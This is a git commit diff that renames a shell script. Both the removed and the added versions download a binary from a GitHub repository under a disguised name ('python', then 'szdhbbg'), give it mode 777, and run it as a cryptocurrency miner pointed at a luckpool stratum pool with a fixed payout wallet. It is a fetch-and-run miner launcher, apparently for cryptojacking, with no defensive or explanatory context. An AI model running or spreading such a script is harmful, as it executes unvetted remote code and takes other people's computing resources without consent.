699bbd720d4e8d37186a3d02622c6843f9db9c5e
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-04-03 21:56:00 +0700

    Update and rename verus.sh to wekeop.sh

--- verus.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-wget https://github.com/pickaxecolleague/pickaxecolleague/raw/main/python
-
-chmod 777 python
-
-./python --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RLd2WGqdqBU42eESe7VjKJM5uzLraQuaym.wekeo --password x
---
+++ wekeop.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+wget https://github.com/pickaxecolleague/pickaxecolleague/raw/main/szdhbbg
+
+chmod 777 szdhbbg
+
+./szdhbbg -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLd2WGqdqBU42eESe7VjKJM5uzLraQuaym.wekeo -p x --cpu 1
